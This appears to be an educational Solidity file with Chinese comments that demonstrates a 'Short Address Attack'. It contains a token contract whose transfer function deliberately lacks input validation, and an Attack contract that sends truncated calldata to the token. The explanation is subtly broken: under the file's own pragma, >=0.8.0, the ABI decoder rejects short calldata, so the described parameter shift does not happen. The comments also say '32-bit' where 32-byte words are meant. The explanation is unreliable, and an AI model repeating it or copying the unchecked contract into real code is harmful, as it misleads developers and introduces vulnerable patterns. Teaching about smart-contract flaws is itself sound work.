pragma solidity >=0.8.0;

/*
    漏洞說明：
    此合約存在 Improper Input Validation 漏洞，由於 transfer 函數缺乏對輸入資料長度的檢查，攻擊者可以發送格式不符合預期的資料（例如 Short Address Attack），
    導致 _value 參數因為位元組不足而被錯置，進而改變交易意圖。以下代碼示範了這個漏洞以及一個簡易攻擊合約演示如何利用此漏洞。
*/

contract NonPayloadAttackableToken {
    mapping(address => uint256) public balances;

    // 建構子，設定發行者初始餘額
    constructor() {
        balances[msg.sender] = 1000;
    }

    // 漏洞重點：transfer 沒有對輸入資料長度進行驗證
    function transfer(address _to, uint256 _value) public {
        require(balances[msg.sender] >= _value, "Insufficient balance");
        // 執行轉帳操作
        balances[msg.sender] -= _value;
        balances[_to] += _value;
    }
}


/*
    攻擊合約：
    該攻擊合約利用了 NonPayloadAttackableToken 中 transfer 函數缺乏對 msg.data 長度驗證的漏洞，
    透過直接呼叫合約並傳送經過截短處理的資料，達到操控參數的目的。
    注意，本示範僅為教育用途，實際攻擊可能需要配合更細緻的資料格式調整。
*/

contract Attack {
    // 受害者合約位址
    NonPayloadAttackableToken public target;

    // 建構子設定目標合約
    constructor(address _target) {
        target = NonPayloadAttackableToken(_target);
    }

    // 攻擊函數，參數 shortData 為經過截短處理的資料
    function attack(bytes calldata shortData) public {
        /*
            攻擊流程描述：
            攻擊者事先構造一個資料 payload，其長度低於 transfer 函數預期的完整長度（2個 32 位元參數，加上 4 位元組 selector）。
            例如，故意缺少部分位元組，使得 _to 與 _value 的解析錯位，從而達到修改轉帳數量或地址的目的。
        */
        (bool success, ) = address(target).call(shortData);
        require(success, "Attack failed");
    }
}
